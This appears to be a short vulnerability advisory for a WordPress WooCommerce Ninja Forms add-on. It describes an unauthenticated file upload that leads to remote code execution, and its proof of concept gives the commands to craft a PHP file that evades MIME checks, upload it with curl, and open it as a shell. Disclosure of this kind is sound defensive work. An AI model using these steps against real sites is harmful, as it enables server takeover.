## WordPress Plugin Vulnerabilities

# WooCommerce Ninja Forms Product Add-ons < 1.7.1 - Unauthenticated Arbitrary File Upload

### Description

The plugin does not validate the file to be uploaded, allowing any unauthenticated users to upload arbitrary files to the server, leading to RCE.

### Proof of Concept

Make sure to have both WooCommerce and NinjaForms 3.4.34.2 (NF's latest version on the 3.4 branch) installed, then follow those instructions:
1 - Run the following shell command to create a PHP file who's mime type will be detected as text/plain:
echo 'Hello world! <?php phpinfo();' > shell.php
2 - Run the following curl command to upload the malicious PHP file onto the site:
curl 'https://example.com/wp-admin/admin-ajax.php' -F 'action=wc\_nf\_submit' -F 'f[]=@shell.php'
3 - Visit the uploaded shell at 'https://example.com/wp-content/uploads/YYYY/MM/shell.php
